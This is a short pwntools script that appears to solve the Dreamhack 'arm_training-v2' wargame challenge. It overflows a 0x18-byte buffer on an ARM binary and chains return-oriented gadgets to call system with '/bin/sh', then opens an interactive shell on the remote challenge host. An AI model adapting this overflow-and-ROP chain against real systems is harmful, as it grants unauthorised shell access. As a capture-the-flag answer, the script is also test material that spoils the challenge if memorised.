from pwn import *

context.arch='arm'
# r = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './arm_training-v2'])
HOST, PORT = 'host3.dreamhack.games', 18024
r = remote(HOST, PORT)

binsh=0x106a4
system=0x103fc
mov_r0_r3=0x10598
pop_r3=0x103c0

payload = b'A'*0x18 + p32(pop_r3) + p32(binsh) + p32(mov_r0_r3) + p32(system)
r.send(payload)

r.interactive()